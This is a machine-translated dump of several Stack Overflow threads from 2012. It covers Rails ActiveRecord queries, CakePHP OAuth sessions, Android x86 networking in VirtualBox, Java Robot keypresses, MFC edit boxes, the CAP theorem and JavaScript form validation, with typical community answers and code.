如果您想在客户端上运行程序，这是不可能的。请参阅[如何在客户端运行程序或批处理文件？](https://stackoverflow.com/questions/877774/how-can-i-run-a-program-or-batch-file-on-the-client-side)

* * *

## 回答 #2

> 赞同：-6
> 
> 时间：2012-04-09T05:10:32.047

运行时 rt = Runtime.getRuntime(); Process proc = rt.exec("你的应用路径");

# ruby-on-rails - 如何在控制器的动作中使用数组变量

> ID：10069118
> 
> 赞同：0
> 
> 时间：2012-04-09T05:06:41.277
> 
> 标签：ruby-on-rails, arrays, ruby-on-rails-3, model-view-controller, controller-action

**我想获取那些与当前用户上同一所大学的用户发布的所有帖子......所以在我的欢迎控制器中，我编写了以下代码......**

* * *

```
class WelcomesController < ApplicationController

def index

  @col = Education.select(:college_id).where(:user_id => @current_user)
  @user = Education.select(:user_id).where(:college_id => @col)
  @welcome = Welcome.where(:user_id => @user)

end

end 
```

* * *

**以下是我的欢迎和教育模型的 shema 代码：**

```
create_table "welcomes", :force => true do |t|
    t.text     "message"
    t.integer  "user_id"
end

create_table "educations", :force => true do |t|
    t.integer  "college_id"
    t.integer  "user_id"
end 
```

* * *

`@col = Education.select(:college_id).where(:user_id => @current_user)`....**此行返回与当前登录用户关联的大学 ID。这在我的控制台上完美运行，返回以下输出..**

```
[#<Education college_id: 1>, #<Education college_id: 2>] 
```

**但我不知道如何在下一行使用这个输出，所以我写了这个语句，它应该返回所有用户，其大学 id 是前一个语句的输出**

```
@user = Education.select(:user_id).where(:college_id => @col) 
```

**我的最后一行应该返回那些 id 在 @user 数组中的用户发布的所有帖子：**

```
 @welcome = Welcome.where(:user_id => @user) 
```

**但这不起作用。当我运行我的项目时，我在页面和控制台上看不到任何输出，我得到以下输出：SELECT . `welcomes`* FROM `welcomes`WHERE ( .IN (NULL)) 这意味着它没有得到任何用户 ID..我该如何解决这个...`welcomes``user_id`**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:37:04.157

你可以试试这个：

```
@col = Education.select(:college_id).where(:user_id => @current_user.id).all
@users = Education.select(:user_id).where(:college_id => @col.collect(&:college_id)).all
@welcome = Welcome.where(:user_id => @users.collect(&:user_id)).all 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:56:18.460

我认为实现此目的的最佳方法是在您的用户模型和教育模型之间建立 has_many_and_belongs_to_many 关系。（每个教育将有许多用户，每个用户可能有多个教育。）您需要在数据库中创建一个连接表来支持这种类型的关系 - 有关这方面的更多信息，请参阅[Rails 指南](http://guides.rubyonrails.org/association_basics.html#the-has_and_belongs_to_many-association)。

我会以这种方式设置您的模型：

```
class User < ActiveRecord::Base
  has_one :welcome
  has_and_belongs_to_many :educations
end

class Education < ActiveRecord::Base
  has_and_belongs_to_many :users
end

class Welcome < ActiveRecord::Base
  belongs_to :user
end 
```

has_many_and_belongs_to_many 连接表迁移的连接表（请务必仔细检查此代码，不确定我是否完全正确）：

```
def self.up
  create_table 'education_user', :id => false do |t|
    t.column :education_id, :integer
    t.column :user_id, :integer
  end
end 
```

您的控制器代码现在要简单得多，如下所示：

```
@welcomes = @current_user.eductions.users.welcome.all 
```

在您看来：

```
<% @welcomes.each do |welcome| %>
  <p><%= welcome.message %></p>
<% end %> 
```

Ruby on Rails 更强大的特性之一是模型关系。它们的前期工作要多一些，但如果您花时间正确设置它们，它们可以让您的生活更轻松，正如上面简化的 @welcomes 查询所证明的那样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T07:14:42.730

我建议你在用户和拼贴之间建立关系

```
class User < ActiveRecord::Base
  has_many :educations
  has_many :colleges, :through => :educations
  has_many :posts

  scope :by_college_id, lambda {|cid| where("exists (select educations.id from educations where educations.user_id = users.id AND educations.college_id in (?) limit 1)", Array.wrap(cid)) }

  def college_mates
    self.class.by_college_id(self.college_ids).where("users.id != ?", id)
  end :through => :educations
end

class Education < ActiveRecord::Base
  belongs_to :user
  belongs_to :college
end 
```

所以现在在你的控制器中你可以写

```
class WelcomesController < ApplicationController
  def index
    @posts = @current_user.college_mates.includes(:posts).map(&:posts).flatten
    # or
    @posts = Post.where(user_id: @current_user.college_mates.map(&:id))
  end
end 
```

第二个变体生成 3 个 sql 请求，第一个变体 - 只有两个。但这是与数据相同的工作，我认为时间也会相同。通常控制器只包含几行代码，所有逻辑都写在模型中。理想情况下，控制器应仅包含`Post.by_college_mates_for(@curren_user.id)`

# php - Session，PHP 不完整类

> ID：10069120
> 
> 赞同：3
> 
> 时间：2012-04-09T05:06:56.887
> 
> 标签：php, cakephp

我正在使用 cakePHP 2.x 。目前正在处理 twitter OAuth，[http://code.42dh.com/oauth/](http://code.42dh.com/oauth/)。

```
function twitter_authentication()
{
            //assume above coding is all correct.   
    $this->Session->write('twitter_request_token', ($requestToken));
    $this->redirect('http://api.twitter.com/oauth/authenticate?force_login=true&oauth_token='.$requestToken->key); //I able to get $requestToken.
}

function twitter_login()
{
        $requestToken = $this->Session->read('twitter_request_token');
        $accessToken = $this->OAuthConsumer->getAccessToken('Twitter','https://api.twitter.com/oauth/access_token', $requestToken); 
```

在 function_login() 中，我未能阅读会话并以 PhP Incomplete Class 结束。如果我这样做`$this->Session->write('twitter_request_token', serialize($requestToken));`并且`$requestToken = $this->Session->read(unserialize('twitter_request_token');`它会起作用，但我会在其他地方因使用序列化和反序列化会话而导致错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:07:20.243

“PHP 不完整类”表示 PHP 没有您正在加载的对象的类定义。

选项 A：在将对象写入会话时确定该对象是什么类，并确保在加载对象之前加载该类的定义。

选项B：`stdClass`在写入之前将对象转换为或数组，并在加载后转换回来。这可能比第一个选项更复杂。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-20T07:46:07.917

OAuth.php 的 OauthToken 类非常简单，只有两个属性：key 和 secret。获取登录 url 后，可以将其作为数组存储到会话中：

```
CakeSession::write('Twitter.requestToken', array(
    'key' => $requestToken->key,
    'secret' => $requestToken->secret
)); 
```

然后，在调用 OAuthClient->getAccessToken() 时实例化您自己的 OAuthToken，如下所示：

```
$sessionRequestToken = CakeSession::read('Twitter.requestToken');
$accessToken = $twitterClient->getAccessToken('https://api.twitter.com/oauth/access_token', 
    new OAuthToken($sessionRequestToken['key'], $sessionRequestToken['secret'])); 
```

应该准备好了：

```
if ($accessToken) {
    $twitterClient->post($accessToken->key, $accessToken->secret, 
        'https://api.twitter.com/1/statuses/update.json', array('status' => 'My balls smells like A-1 sauce. #science'));
} 
```

# networking - VirtualBox 4.1.2 上的 Android x86 中没有网络

> ID：10069121
> 
> 赞同：34
> 
> 时间：2012-04-09T05:07:06.933
> 
> 标签：networking, ubuntu, virtualbox, android-x86, ifconfig

[我的问题与这个问题](https://stackoverflow.com/questions/8227825/android-x86-porting-unable-to-make-it-work)几乎相同。我尝试了这些解决方案，但都没有奏效。但我使用的是不同的 Android x86 图像。我正在使用 ICS (4.0-RC1) asus_laptop 图像。（我之前尝试过不同的图像，但无法安装。）

我在 Kubuntu 12.04 上安装了 VirtualBox 4.1.12。我按照[这些步骤](https://stackoverflow.com/questions/1554099/slow-android-emulator/6058689#6058689)在我的 VM 中安装了[android-x86-4.0-RC1-asus_laptop.iso映像。](http://code.google.com/p/android-x86/downloads/detail?name=android-x86-4.0-RC1-asus_laptop.iso&can=2&q=)它启动并正常工作，但网络除外。

Alt-F1`netcfg`显示除了 lo (127.0.0.1) 之外没有任何接口。未显示应该可用的 eth0。[这使我无法在这里](http://osdir.com/ml/android-x86/2011-11/msg00352.html)尝试解决方案。

我正在检查的新参考：

*   [带有 Internet 连接的 VirtualBox 上的 Android ICS x86](https://stackoverflow.com/questions/9847285/android-ics-x86-on-virtualbox-with-internet-connection)
*   [http://groups.google.com/group/android-x86/browse_thread/thread/30fa23d81cddfab1/2e480f6b9cbf773d](http://groups.google.com/group/android-x86/browse_thread/thread/30fa23d81cddfab1/2e480f6b9cbf773d)
*   [如何在 VirtualBox 中为 Android Honeycomb 设置网络？](https://stackoverflow.com/questions/7825934/how-to-setup-network-for-android-honeycomb-in-virtualbox)

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-04-13T02:55:57.973

以下对我很有用

```
sudo vi /etc/init.sh 
```

将下面的 4 行添加到 init.sh

```
netcfg eth0 dhcp
echo nameserver <ip> > /etc/resolv.conf
dnsmasq 
setprop net.dns1 8.8.8.8 
```

在 virtualbox 上将网络接口设置为桥接（PCnet Fast III），仅此而已。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-06-13T18:21:56.923

**更新：如果 Android x86 不适合您，您可能需要查看[AndroVM](https://www.genymotion.com/#!/support#faq)。我在 VirtualBox 中运行它并且没有遇到与硬件相关的问题。**

**真实答案：**

有点后续回答，因为我还不能添加评论。我认为获得此设置高度依赖于您的主机硬件。我没有使用完全适合任何当前 ISO 的硬件。所以我用所有的以太网设置测试了所有这些，看看什么会起作用。

在戴尔 Latitude D820 上，这是我得到的：

*   eeepc - 带 PCnet-PCI II 的桥接适配器
*   tegav2 - 带有 PCnet-PCI III 的 NAT 适配器
*   amd_brazos - 不支持 CPU
*   asus_laptop - 任何以太网适配器设置都没有 eth0 选项
*   s104t - 无法启动

对于对我有用的两个 ISO（eeepc 和 tegav2），我添加了以下两行`/etc/init.sh`（根据另一个答案）

```
netcfg eth0 dhcp
setprop net.dns1 8.8.8.8 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-13T09:46:24.963

对我来说，user1330614 的解决方案效果很好。可以在这里找到另一个关于该问题的好文章：http: [//davematthew.blogspot.de/2012/04/android-x86-ics-on-virtualbox.html](http://davematthew.blogspot.de/2012/04/android-x86-ics-on-virtualbox.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T05:18:38.660

试试这个

```
VBoxManage modifyvm "Your Android VB name" --natpf1 adb,tcp,*,5555,*,5555 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-04-06T09:05:32.230

如果您无法编辑`/etc/init.sh`或`/etc/init.androVM.sh`错误是只读文件（尽管是`su`），您可以在命令行上以超级用户身份编写以下内容：

```
setprop net.dns1 10.0.0.138 
```

或任何其他 IP，这通常是本地路由器（支持 DNS）。检查您的网络连接详细信息以获取此 IP。

缺点是，你必须每次都这样做，但这不是很耗时。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-02-18T10:59:52.263

我必须在 Android 设置中启用 WiFi 并选择 VirtualBox 创建的虚拟网络。在我的情况下，它被称为“VirtWifi”，这是一个使用我的计算机网络的假 WiFi 网络。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-10T03:16:36.210

网络中的一些消息来源说您应该在 VBox 机器设置中以桥接模式或 NAT 使用 PCnet-Fast III。试一试。这是我找到的指南，但老实说，我是 VBox 上的 Android 新手（甚至是 Android 新手），我自己没有测试过。

# frameworks - Xcode 3.2.3 是否支持核心实用程序功能？

> ID：10069122
> 
> 赞同：0
> 
> 时间：2012-04-09T05:07:07.763
> 
> 标签：frameworks, xcode3.2, utility

当我坚持为我的应用程序使用实用程序功能时，我正在使用**Xcode 3.2.3 。**我在我的 Core Graphics Framework 文件夹中找不到**CGpointUtills函数。**像这样

```
developer/platforms/IphoneSimulatorOs/Developer/SDK/Simulator4.0/System/Library/Framework/CoreGraphic/ 
```

这是否意味着 Xcode 3.2.3 不支持 Utility 功能或与此相关的任何其他问题？

谢谢 。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:25:41.653

CGPointUtils***不是***Core Graphics 或 iPhone SDK 的一部分。它实际上来自 Jeff LaMarche 和其他几位作者的一本书，[“开始 IOS 5 开发：探索 IOS SDK”](http://books.google.com/books?id=sikKz-oQNFIC&pg=PA628&lpg=PA628)。

您可以通过谷歌搜索获得 CGPointUtils 代码的副本。我可以在“CGPointUtils.h”的第 1 次点击中看到它： [http ://code.google.com/p/hedgewars/source/browse/project_files/HedgewarsMobile/Classes](http://code.google.com/p/hedgewars/source/browse/project_files/HedgewarsMobile/Classes)

从那里抓取它，然后将 .c 和 .h 文件放入您的项目中，您应该已经准备就绪。

# entity-framework-4 - 更新子记录，在主表中插入一条新记录

> ID：10069123
> 
> 赞同：1
> 
> 时间：2012-04-09T05:07:21.710
> 
> 标签：entity-framework-4, parent-child

我有两个实体，即

```
public class Employee
{
  public int ID{get;set;}
  public string value{get;set;}
  public int DepartmentID{get;set;}
  public  virtual Department department {get;set;}
}

public class Department
{
   public int ID{get;set;}
   public string Name{get;set;}
} 
```

我正在使用存储库模式和 DTO。我正在使用 EF4 从 SQL Server 2008 访问数据。我能够从员工表中检索数据以及引用的数据。问题是当我在业务逻辑中更新子表中的记录时，一条新记录被插入到主表中，然后在子表中引用该记录的 ID。

有人可以帮我吗？

# java - java.awt.Robot.keyPress 用于连续击键

> ID：10069126
> 
> 赞同：3
> 
> 时间：2012-04-09T05:08:20.910
> 
> 标签：java, eclipse, keypress, unity3d, awtrobot

所以，这是我的问题。我有一个 java 程序，它将根据用户与 android 手机的交互方式将击键消息发送到游戏（内置于 Unity）。（我的 java 程序是通过 wi-fi 进行 android 交互的监听器） 现在，为了做到这一点，我正在使用`java.awt.Robot`将 keyPresses 发送到游戏窗口。我在侦听器程序中编写了以下代码块：

```
if(interacting)
{
    Robot robot = new Robot();
    robot.keyPress(VK_A);
    robot.delay(20); //to simulate the normal keyboard rate
} 
```

`interacting`现在，只要用户按下手机的触摸屏，该变量就会为真，而我打算实现的是将连续的击键消息链传递给游戏（通过侦听器）。但是，出于某种原因，这会严重影响性能。我注意到游戏变得很慢（帧速率迅速下降），甚至计算机也变得很慢，一般来说。怎么了？我应该`robot.keyRelease(VK_A)`在每个之后使用一个`keyPress`吗？但是我的游戏有一个不同的动作映射到一个键的释放，我不希望快速按键和释放；我真正想要的是模拟连续击键，*就像*用户手动按下`A`键盘上的键一样。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T07:08:17.283

机器人对象实际上将模拟与任何普通用户相同的键盘和鼠标控制模式。因此，在每次按下某个键的情况下，都应该释放它。

```
Robot robot = new Robot();
robot.delay(10000);
robot.keyPress(KeyEvent.VK_WINDOWS);
robot.keyPress(KeyEvent.VK_R);
robot.keyRelease(KeyEvent.VK_R);
robot.keyRelease(KeyEvent.VK_WINDOWS);
robot.delay(2000);
robot.keyPress(KeyEvent.VK_N);
robot.keyRelease(KeyEvent.VK_N);
robot.keyPress(KeyEvent.VK_O);
robot.keyRelease(KeyEvent.VK_O);
robot.keyPress(KeyEvent.VK_T);
robot.keyRelease(KeyEvent.VK_T);
robot.keyPress(KeyEvent.VK_E);
robot.keyRelease(KeyEvent.VK_E);
robot.keyPress(KeyEvent.VK_P);
robot.keyRelease(KeyEvent.VK_P);
robot.keyPress(KeyEvent.VK_A);
robot.keyRelease(KeyEvent.VK_A);
robot.keyPress(KeyEvent.VK_D);
robot.keyRelease(KeyEvent.VK_D);
robot.keyPress(KeyEvent.VK_ENTER);
robot.keyRelease(KeyEvent.VK_ENTER); 
```

这个例子将打开一个记事本窗口。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:25:05.770

是的，如果你按下一个键，`Robot`你也需要释放它。

也许沿着这些思路？

```
Robot robot = new Robot();

if(interacting)
{
    robot.keyPress(VK_A);
    robot.delay(20); //to simulate the normal keyboard rate
    robot.keyRelease(VK_A);
    robot.delay(20); //to simulate the normal keyboard rate
} 
```

# html - 将宽度设置为所有 div

> ID：10069127
> 
> 赞同：0
> 
> 时间：2012-04-09T05:08:21.410
> 
> 标签：html, width, stylesheet

我敢肯定这很简单，但我无法弄清楚如何改变 div 的宽度。

我需要它们为 1024 像素，我在样式表中为每个设置了它，但它***仍然***拒绝这样做。

有人可以*指出*我缺少什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:12:19.067

不看代码就很难回答你的问题，但是既然你提到了脚本，也许你正在使用 jquery，这应该可以做到

```
 $('div').css("width","1024px"); 
```

# asp.net - ASP.NET 中 ValidationExpression 中 " 的转义字符

> ID：10069137
> 
> 赞同：2
> 
> 时间：2012-04-09T05:09:32.927
> 
> 标签：asp.net, regex, validation

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T05:19:27.307

您应该能够传入 HTML 编码值。所以，通过`&quot;`就像通过`"`。像这样的东西：`ValidationExpression="^[^&quot;]+$"`。在这个正则表达式中，我说的是：匹配从字符串开头到结尾的任何字符，而不是引号 ( `"`)。

这同样适用于其他特殊符号。您可以在[此处](http://www.ascii.cl/htmlcodes.htm)查看更多编码值。

# android - 人们在哪里制作背景？

> ID：10069140
> 
> 赞同：0
> 
> 时间：2012-04-09T05:10:16.967
> 
> 标签：android, image

我正在构建一个应用程序，目前正在添加背景。我制作背景的方法是在 Microsoft Word 中设计它，然后将其粘贴到 Paint 中，然后将其保存为 .png 文件。这种方式有效，但无法在手机上提供清晰明快的画面。我想知道你们在将背景放入应用程序时使用什么。（即Photoshop）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:12:59.993

Photoshop 或 GIMP 将是我的第一个建议

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:20:00.193

是的，Photoshop 是更好的选择，但现在如果您不熟悉 Photoshop，您可以轻松地在线制作它们。

检查以下...

[墙创造者](http://www.wallcreator.com/)

[bg模式](http://bgpatterns.com/)

[x3工作室](http://wallpapers.x3studios.com/)

[点击这个到谷歌搜索结果](https://www.google.co.in/webhp?sourceid=chrome-instant&ie=UTF-8&ion=1#hl=en&site=webhp&sa=X&ei=SnCCT6vfAoy3rAfVofjwBQ&ved=0CCQQvwUoAQ&q=online%20background%20maker&spell=1&bav=on.2,or.r_gc.r_pw.r_cp.,cf.osb&fp=83489586dc43acf&ion=1&biw=1280&bih=849)

# visual-c++ - 如何在VC++中检查编辑框是否为空

> ID：10069142
> 
> 赞同：1
> 
> 时间：2012-04-09T05:10:27.353
> 
> 标签：visual-c++

我正在使用 MFC 框架创建 vs++ 代码。我在表单中有一个名为“IDC_EDIT1”的 Cedit 框。谁能告诉我如何检查编辑框是否为空？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:45:01.950

```
CEdit *editBox = (CEdit *) GetDlgItem(IDC_EDIT1);

if(editBox == NULL)
  return;
CString str;
editBox->GetWindowTextW(str);

if(str.IsEmpty())
{
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:14:58.263

您可以使用 WM_GETTEXTLENGTH 消息：

```
int length = SendMessage(hwnd,WM_GETTEXTLENGTH,0,0);
if(length == 0)
{
     MessageBox(0,"The edit box is empty.",0,0);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-06T13:21:56.277

这是一个计算器程序，我正在检查按钮是否按下编辑框控件是否为空。

（`IDC_Display`编辑控件）连接到变量`m_Display`（`cEdit`类型）

我取了另一个变量`cString`Type ( `m_TrialString`)。在下面的类定义中声明它`m_Display`。

在您编写的按钮单击事件上：

```
void CNewCalculatorDlg::OnBnClickedButton1()

{   
m_Display.GetWindowText(m_TrialString);
if (m_TrialString.IsEmpty())
    AfxMessageBox(_T("The CString is EMPTY"),MB_OK);
else
    AfxMessageBox(_T("The CString is NOT EMPTY"), MB_OK); 
```

}

# database - 如何理解 CAP 定理的“可用性”？

> ID：10069147
> 
> 赞同：20
> 
> 时间：2012-04-09T05:10:38.697
> 
> 标签：database

我不知道这是否是一个合适的问题。

众所周知，在 CAP 定理中，“A”表示“可用性”。在[wikipedia](http://en.wikipedia.org/wiki/CAP_theorem)上，“可用性”的解释是：

```
Availability: a guarantee that every request receives a response about whether it was successful or failed 
```

但是，从工程的角度来看，没有**绝对**的可用性。我们只能说一个系统的可用性是 5'9'(99.999%)，甚至是 8'9'，但我们不能说一个系统的可用性是 100%，100% 可用的系统在现实中并不存在，即使系统有数百万个重复节点，对吧？

CAP 定理证明没有一个系统可以同时满足这 3 个要求。我的问题是，如果一个系统声称同时满足“A”和“P”，那么这个“A”的准确含义是什么？6'9' 甚至更高？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-09T06:40:15.777

我建议您避免使用 Wikipedia，而是阅读[Gilbert 和 Lynch](https://users.ece.cmu.edu/~adrian/731-sp04/readings/GL-cap.pdf)证明中提供的定义。

> *“系统中非故障节点*收到的每个请求都必须产生响应”

以及回答您问题的相关脚注

> “Brewer 最初只要求几乎所有请求都能收到响应。由于允许概率可用性不会在发生任意故障时改变结果，为简单起见，我们要求 100% 可用性”

因此，如果几乎所有请求都收到响应，或者我们允许发生任意故障，则可以认为系统具有高可用性。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-01-26T16:05:45.117

CAP 中的可用性意味着“所有（非故障）节点都可用于查询”。它与关于“高可用性”的维基百科链接无关。

例如，PAXOS 算法是 CP（无可用性属性），因为少数节点在分区期间“关闭”。但是如果你需要一致性，那么 PAXOS 被认为是“高可用性”。

相反，单节点 MySQL 数据库服务器是 CA（具有 CAP 可用性属性）。它可以重新启动（并且在进行 BIOS 检查、文件系统检查、数据库修复等时会关闭数小时）。当它完成启动时，它会再次开始响应查询。这是完美的可用性（根据 CAP 定理），但“高可用性”的可用性却很糟糕。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-07T08:51:01.340

我同意 Mark Burgess[的观点：CAP 定理不是定理](http://blog.franslundberg.com/2013/12/the-cap-theorem-is-not-theorem.html)。Brewer 猜想中的 CAP 属性根本不够明确，无法提供严格的数学证明。因此，可用性难以“理解”的原因可能是因为它在这种情况下没有明确定义。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-11-13T17:57:06.127

[Coda Hale](https://codahale.com/you-cant-sacrifice-partition-tolerance/)的一个有趣的观点

选择**可用性**的系统将通过继续服务所有请求来处理网络分区，即使它们导致不一致（例如，不同网络分区中的节点都接受可能发生冲突的写入）。

选择**一致性**的系统将限制网络分区期间合法操作的数量（例如，不接受写入，因为它们可能导致冲突/不一致）。

不可能同时选择两者。

我想一个假设的系统也可以选择在网络分区期间崩溃，但这似乎不是一个非常实用的设计......

# ruby-on-rails - Is it valid to include view code in Model?

> ID：10069153
> 
> 赞同：2
> 
> 时间：2012-04-09T05:11:14.313
> 
> 标签：ruby-on-rails, rails-activerecord, erb

Guys I'm new to RoR and MVC.

I've a model which deals with loan beneficiary's data. To access the structured data (including small piece of HTML data) I created a method like this

```
class Beneficiary  < ActiveRecord::Base
  def  info
     "#{name}</br>#{age},#{sex}</br><b>Address :</b>#{address}"
  end
end 
```

And in the view, I'm using this info something like this

```
<%= @b.info.html_safe %> 
```

were, **b** is an instance of Beneficiary class

It's working fine for me. I just want to know that, Am i violating the MVC rule here? Is it valid to include view code in Model?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:21:45.500

If you want to use HTML tag to display data you can write helper method instead of writing into model.Or more you want to re factor or clean your code you can watch [draper](http://railscasts.com/episodes/286-draper) or [presenter](http://railscasts.com/episodes/287-presenters-from-scratch)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:23:27.147

It's better to put this into a helper file.

```
# /app/helpers/beneficiary_helper.rb

module BeneficiaryHelper

  def beneficiary_info(b)
    "#{b.name}<br>#{b.age},#{b.sex}<br><b>Address:</b>#{b.address}"
  end
end 
```

In your view, you can simply use

```
<%= raw beneficiary_info(@b) %> 
```

Note: I'd recommend using `<span>` elements with a class attribute and CSS to handle line breaks and font weights instead of `<br>` and `<b>`

Additional Note: If you want helper to be available for the entire application, you can put it in `/app/helpers/application_helper.rb`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T11:02:22.913

I'm sure a model it's **not** the place where to put HTML, use an helper is an improvement for sure but consider the possibility to use a partial:

```
# /views/beneficiaries/_beneficiary.html.erb
<%= beneficiary.name %><br />
<%= beneficiary.age %>,<%= beneficiary.sex %><br />
<b>Address :</b><%= beneficiary.address %> 
```

and then in your view when you need to show the beneficiary info render this partial:

```
<%= render @beneficiary %> 
```

**UPDATE**: If you need to show the beneficiary in a way and his/her info in a different way you should put beneficiary info in **/views/beneficiaries/_info.html.erb** and then call render this way:

```
render :partial => "beneficiaries/info", :locals => {beneficiary: @beneficiary} 
```

# javascript - 显示成功消息不适用于 JavaScript

> ID：10069156
> 
> 赞同：0
> 
> 时间：2012-04-09T05:11:27.450
> 
> 标签：javascript

```
$.ajax({ 
     type: "POST",
     url:'/saveLayout',          
     data: {id : layoutId, section :  arrSection},
     success: function(response){  
               $('#successMsg').addClass("errorBox");
               document.getElementById('successMsg').innerHTML="Your data has been successfully          saved.";
              }
    }); 
```

在 ajax 成功函数中显示成功消息在 Crome 中第二次不起作用。
成功消息第一次起作用。但在那之后它就不起作用了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:35:30.993

您的代码正在重用相同的 HTML 块来显示成功消息，因此第二条消息将简单地替换第一条消息。如果您希望它同时显示两条成功消息，则需要附加该消息。那是问题吗？

这是附加消息的示例：

```
$.ajax({
    type: "POST",
    url:'/saveLayout',
    data: {
        id : layoutId,
        section : arrSection
    },
    success: function(response) {
        $("#successMsg").addClass("errorBox").append("Your data has been successfully saved.");
    }
}); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-09T05:32:11.947

我认为您需要在添加之前删除错误框类。

```
$('#successMsg').removeClass("errorBox"); 
$('#successMsg').addClass("errorBox"); 
```

# php - 使用 javascript 进行 php 表单验证

> ID：10069157
> 
> 赞同：0
> 
> 时间：2012-04-09T05:11:27.730
> 
> 标签：php, javascript, forms

嗨，伙计们，我需要帮助来弄清楚为什么当我运行它时警报框没有出现。我也是编程新手。html 我到期就好了。我目前正在上 php 课程，老师认为让我们创建一个表单并验证它会很有趣。我的问题是我正在尝试调用该函数然后对其进行验证。我的问题是它没有调用它，我无法弄清楚为什么。请帮忙？

乔恩斯·维拉丁

```
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">

<head>
   <link rel="stylesheet" href="decor.css" type="text/css">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>jons viladating</title>
<script type="text/javascript">
<!-- <![CDATA[
   function showjonsForm() {
var errors = "";
// check for any empty strings
  if (document.forms[0].fname.value == "")
      errors += "fname\n";
          if (document.forms[0].lname.value == "")
      errors += "lName\n";
  if (document.forms[0].addrs1.value == "")
  errors += "Address\n";
  if (document.forms[0].city.value == "")
  errors += "City\n";
  if (document.forms[0].state.value == "")
      errors += "State\n";
  if (document.forms[0].zip.value == "")
      errors += "Zip\n";
   if (document.forms[0].phone.value == "")
       errors += "Phone\n";
  if (document.forms[0].email.value == "")
      errors += "Email\n";
  if (document.forms[0].pw2.value == "")
      errors += "Confirm password\n";

   if (document.forms[0].dob.value == "")
      errors += "Date of birth\n";
  if (document.forms[0].sex.value == "")
     errors += "sex\n";
     // don't need to check checkboxes
   if (errors != "") {  //something was wrong}))
      alert ("Please fix these errors\n" + errors) ;
          return false;
 }
       var stringx;
    stringx = "fName:" + document.forms(0).fname.value;
    stringx = "lName:" + document.forms(0).lname.value;
    stringx += "\nAddress: " + document.forms(0).addrs1.value;
    stringx += "\nCity: " + document.forms(0).city.value;
    stringx += " \nState: " + document.forms(0).state.value;
    stringx += " Zip: "+ document.forms(0).zip.value;
    stringx += "\nPhone: " + document.forms(0).phone.value;
    stringx += "\nE-mail:" + document.forms(0).email.value;
    stringx += "\nConfirm password " + document.forms(0).pw2.value;
    stringx += "\nDate of birth: " + document.forms(0).dob.value;
    stringx += "\nSex: " + document.forms(0).sex.value;
    alert(stringx);
    return false //set to false to not submit
} 
 //  ]]> -->
</script>
   <h1>jons validations test</h1>
   </head>
 <body>
  <div id="rightcolumn">
 <img src="hula.gif"  align="right"/>   
 </div>
<text align="left">
   <form name="jon"  action="formoutput.php" onsubmit="return showjonsForm()"      Method="post"> 
  <fieldset style="width:250px">
   <label> first name</label> <input type="text" name="fname" size="15" maxlength="22"    onBlur="checkRequired( this,'fname')"/><br />
   <label>last name</label> <input type="text" name="lname" size="10" maxlength="22">      <br />
 </fieldset>
  <fieldset  style="width:250px">
  <label>address</label> <input type="text" name="adrs1" size="10" maxlength="30"><br />
   <span class="msg_container" id="adrs2"></span><br />
   <label>city</label> <input type="text" name="city" size="10" maxlength="15"><br />
   <span class="msg_container" id="city"></span><br />
   <label>state</label> <input type="text" name="state" size="10" maxlength="2"><br />
   <span class="msg_container" id="state"></span><br />
   <label>zip</label> <input type="text" name="zip" size="10" maxlength="5"><br />

  </fieldset>
  <fieldset style="width:250px">
   <label>phone</label> <input type="text" name="phone" size="10" maxlength="10"><br />
  <div>please input phone number in this format 1234567892 thank you </div>
   <label>email</label> <input type="text" name="email" size="10" maxlength="22"><br />
   <div> password must have 1 number  upper case and minimum of 6 charcters</div> 
   <label>password</label> <input type="text" name="pw2" size="10" maxlength="12"><br  />
   <label>select gender type</label> <select name="sex" size="1" <br />
   <option>male</option>
   <option>female</option>
   <option>timelord</option>
   </select>
   <label>date of birth</label> <input type="text  name="dob" size="8" maxlength="8"/>
   <div> would you like to know know more</div>
   <label> yes</label> <input type="checkbox"  checked="checked" name="check" />
   </fieldset>  
   <input type="submit"/></form>

   </form>
   <div id="footer">
   <img src="laps2.jpg"> <img src="orange.jpg"><img src="ok.jpg">
   </div>
   </body>
   </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:26:24.810

`<input type="text" name="adrs1" size="10" maxlength="30">`

change into

`<input type="text" name="addrs1" size="10" maxlength="30">`

Because in your JavaScript, it is `document.forms[0].` **`addrs1`** `.value`

* * *

**Not related**

Your Javascipt looks very cumbersome. Maybe you can simplify it?

